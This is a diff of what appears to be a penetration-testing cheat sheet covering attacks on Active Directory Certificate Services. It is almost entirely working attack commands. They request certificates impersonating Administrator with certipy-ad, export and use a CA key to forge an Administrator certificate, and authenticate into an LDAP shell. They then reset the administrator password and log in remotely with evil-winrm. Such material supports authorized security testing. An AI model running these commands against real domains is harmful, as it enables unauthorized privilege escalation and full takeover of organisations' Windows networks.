@@ -415,8 +415,8 @@ WriteOwner
 
 [*] Active Directory: CS
 +---------- Get Certificate ----------+
-certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' req -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dynamic-endpoint
-certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' req -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'Administrator' -target $DC -key-size '4096'
+certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'Administrator' -target $DC -key-size '4096'
+certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dynamic-endpoint
 
 +---------- Forge Certificate ----------+
 certutil -store my
@@ -424,7 +424,10 @@ certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
 
 +---------- Authenticate Certificate ----------+
-certipy-ad -dc-ip $TARGET auth -pfx 'administrator_forged.pfx'
+certipy-ad -dc-ip $TARGET auth -ldap-shell -pfx 'administrator.pfx'
+certipy-ad -dc-ip $TARGET auth -ldap-shell -pfx 'administrator_forged.pfx'
+change_password administrator 123qweasdF!
+evil-winrm -i $TARGET -u administrator -p '123qweasdF!'
 
 [*] Cracking
 +---------- PFX ----------+
